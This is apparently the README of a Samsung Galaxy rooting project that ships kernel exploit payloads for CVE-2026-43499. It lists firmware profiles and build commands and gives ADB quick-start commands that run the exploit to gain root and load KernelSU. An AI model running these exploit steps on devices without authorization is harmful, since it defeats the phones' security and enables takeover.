# Root My Galaxy Payloads

This repository contains the device-specific native side of
[Root My Galaxy](https://github.com/BuSung-dev/Root-My-Galaxy):

- exact firmware profiles and offsets;
- the app-domain CVE-2026-43499 exploit source and compiled payload;
- the app bootstrap helper source;
- the verified KernelSU late-load build artifacts;
- the support feed consumed by the application.

It intentionally does not contain Android application source code.

## Supported payloads

| Payload | Compatible models | Kernel version | Status |
| --- | --- | --- | --- |
| `galaxy-s25-series-2026-06-07` | Galaxy S25, S25+, S25 Edge, and S25 Ultra regional models | `6.6.98` | Device-tested |
| `e3q-S928USQS6DZF2` | Galaxy S24 Ultra `SM-S928U` | `6.1.145` | Hardware debugging in progress |
| `e2s-S926BXXUEDZDR` | Galaxy S24+ `SM-S926B` | `6.1.157` | Device-tested |
| `essi-A566EXXSCCZG6` | Galaxy A56 5G `SM-A566E` | `6.6.102` | Device-tested |
| `a36xq-A366WVLS3AYG1` | Galaxy A36 5G `SM-A366W` | `6.6.46` | Device-tested |
| `dm3q-S9180ZHS8FZF5` | Galaxy S23 Ultra `SM-S9180` | `5.15.189` | Test in progress |
| `dm2q-S916BXXSAFZG1` | Galaxy S23+ `SM-S916B` | `5.15.189` | Experimental: hardware root from ADB shell; not in app feed |
| `dm2q-S916NKSS8FZG1` | Galaxy S23+ `SM-S916N` | `5.15.189` | Experimental: hardware root from ADB shell; not in app feed |
| `f946b-F946BXXS7GZE5` | Galaxy Z Fold 5 `SM-F946B` | `5.15.189` | **Device-tested: full root + KernelSU from ADB shell** |

The S916B FZG1 and F946B F946BXXS7GZE5 profiles are shell-only. Their exact tracefs route works from `adb shell` (`u:r:shell:s0`), but direct app-domain execution is not supported. Root My Galaxy would need to delegate the native runner through an authorized shell bridge such as Shizuku. See [`artifacts/dm2q-S916BXXSAFZG1/README.md`](artifacts/dm2q-S916BXXSAFZG1/README.md).

### Galaxy Z Fold5 (SM-F946B, F946BXXS7GZE5) — Confirmed Working

This fork contains the **device-tested** Fold5 exploit chain:

- **Kernel**: `5.15.189-android13-8-33404244-abF946BXXS7GZE5`
- **Engine**: MCAST/tracefs/shaped-reclaim (PR #223)
- **Result**: `uid=0(root) gid=0(root) context=u:r:kernel:s0`, KernelSU v3.2.5 loaded, no panic
- **All 66 offsets verified** against recovered `vmlinux.elf` + `vmlinux.btf` (see [`docs/f946b-offset-memory.md`](docs/f946b-offset-memory.md))

Quick start (ADB shell, one attempt per boot):

```cmd
adb push artifacts/f946b-F946BXXS7GZE5/cve-2026-43499-app.so /data/local/tmp/f946b.so
adb push artifacts/f946b-F946BXXS7GZE5/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push kernelsu/ksud-f946b-F946BXXS7GZE5-kdp /data/local/tmp/ksud-f946b-kdp
adb shell "chmod 755 /data/local/tmp/cve-2026-43499-root /data/local/tmp/ksud-f946b-kdp"
adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 /data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/f946b.so /data/local/tmp/cve-2026-43499-root /data/local/tmp/f946b.log"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; getenforce'"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'cp /data/local/tmp/ksud-f946b-kdp /data/local/tmp/ksud-s25u-kdp; chmod 755 /data/local/tmp/ksud-s25u-kdp'"
adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
```

Both root and KernelSU are volatile — a reboot removes them.

Schema version 3 keeps each exploit and KernelSU artifact once. Its flat
`models` and `kernelVersions` arrays define runtime compatibility. See
[`support/README.md`](support/README.md) for the matching rules.

The port is based on the exploit source published at
<https://github.com/NebuSec/CyberMeowfia/tree/main/IonStack/CVE-2026-43499/exploit>.

## Feed delivery

Root My Galaxy resolves the payload repository's current commit first and
fetches `support/targets-v3.json` and every artifact from that immutable
commit. Per-artifact SHA-256 fields and manifest signatures are not part of
schema version 3. `targets-v2.json` is retained for released 0.2.3 clients.

## Build

```sh
make TARGET=pa3q-S938NKSUACZF1 ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=e3q-S928USQS6DZF2 ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=e2s-S926BXXUEDZDR ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=essi-S721NKSSCDZF3 ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=e1s-S921BXXSFDZF2 ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=a15-A155NKSS6BYH1 ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=essi-A566EXXSCCZG6 ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=a36xq-A366WVLS3AYG1 ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=dm3q-S9180ZHS8FZF5 ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=dm2q-S916BXXSAFZG1 ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=f946b-F946BXXS7GZE5 ANDROID_NDK_HOME=/path/to/android-ndk
```

Outputs:

```text
build/<profile>/cve-2026-43499
build/<profile>/cve-2026-43499-app.so
build/<profile>/cve-2026-43499-root
```

The release app payload is built with:

```sh
make TARGET=essi-S721NKSSCDZF3 ANDROID_NDK_HOME=/path/to/android-ndk release
```

The complete firmware-to-profile procedure is recorded in
[`docs/PORTING.md`](docs/PORTING.md). Samsung-specific KernelSU changes and
versioned artifacts are documented in [`kernelsu/README.md`](kernelsu/README.md).
The exact S921B DZF2 analysis is recorded separately in
[`docs/SM-S921B-S921BXXSFDZF2.md`](docs/SM-S921B-S921BXXSFDZF2.md), and the
S928U/S928U1 DZF2 analysis is in
[`docs/SM-S928U1-S928U1UES6DZF2.md`](docs/SM-S928U1-S928U1UES6DZF2.md). S921B
is an Exynos 2400 target and is not a Qualcomm/Snapdragon reference for E3Q.
The 5.10 A15 analysis is in
[`docs/SM-A155N-A155NKSS6BYH1.md`](docs/SM-A155N-A155NKSS6BYH1.md).
The SM-A566E CCZG6 analysis and validation record is in
[`docs/SM-A566E-A566EXXSCCZG6.md`](docs/SM-A566E-A566EXXSCCZG6.md).
The SM-S926B DZDR analysis and device-validation record is in
[`docs/SM-S926B-S926BXXUEDZDR.md`](docs/SM-S926B-S926BXXUEDZDR.md).
The Fold5 porting analysis and validation record is in
[`docs/SM-F946B.md`](docs/SM-F946B.md).

The SM-A366W AYG1 device validation is in
[`docs/SM-A366W-A366WVLS3AYG1.md`](docs/SM-A366W-A366WVLS3AYG1.md).
The experimental SM-S916B FZG1 shell port and its exact hardware evidence are in [`docs/SM-S916B-S916BXXSAFZG1.md`](docs/SM-S916B-S916BXXSAFZG1.md).

Use only on devices you own or are explicitly authorized to test.
